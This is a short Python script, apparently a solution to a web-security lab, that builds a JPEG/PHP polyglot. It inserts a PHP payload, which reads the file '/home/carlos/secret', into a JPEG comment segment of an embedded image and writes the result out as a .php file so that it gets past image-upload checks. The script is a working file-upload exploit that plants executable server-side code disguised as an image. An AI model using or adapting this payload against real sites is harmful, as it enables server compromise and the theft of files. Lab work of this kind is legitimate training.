data = (
    b'\xff\xd8\xff\xdb\x00\x43\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07'
    b'\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d'
    b'\x1a\x1f\x1e\x1d\x1a\x1c\x1c\x20\x24\x2e\x27\x20\x22\x2c\x23\x1c'
    b'\x1c\x28\x37\x29\x2c\x30\x31\x34\x34\x34\x1f\x27\x39\x3d\x38\x32'
    b'\x3c\x2e\x33\x34\x32\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01'
    b'\x11\x00\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00'
    b'\x00\x00\x00\x00\x00\x00\x00\x09\xff\xda\x00\x08\x01\x01\x00\x00'
    b'\x3f\x00\x37\xff\xd9'
)

import sys

# 사용법: python3 polyglot.py <원본이미지.jpg> <출력파일.php>
if len(sys.argv) < 2:
    print("Usage: python3 spolyglot.py <output.php>")
    sys.exit(1)

output_file = sys.argv[1]


# 실행할 PHP 웹셸 코드
php_payload = b"<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"

# JPEG Comment (COM) 세그먼트 생성 규칙:
# \xFF\xFE (COM 마커 2바이트) + [데이터길이 2바이트] + [주석으로 실릴 진짜 데이터 가변길이]
# 데이터길이 =  (PHP코드 길이 + 길이 변수 자체의 2바이트). 즉 마커길이는 제외한 바이트수
payload_len = len(php_payload) + 2
len_bytes = payload_len.to_bytes(2, byteorder='big')
com_segment = b'\xFF\xFE' + len_bytes + php_payload



# JPEG 시작 마커(\xFF\xD8) 바로 뒤에 COM 세그먼트를 끼워넣습니다.
if data.startswith(b'\xFF\xD8'):
    if (k := data.find(b'\xFF\xFE'))> -1:
        old_len = int.from_bytes(data[k+2:k+4], byteorder='big')
        next_pos = k + 2 + old_len
        new_data = data[:k] + com_segment + data[next_pos:]
    else:
        new_data = data[:2] + com_segment + data[2:]
    with open(output_file, 'wb') as f:
        f.write(new_data)
    print(f"[+] 성공! {output_file} 파일이 생성되었습니다.")
else:
    print("[-] 오류: 올바른 JPEG 이미지가 아닙니다.")
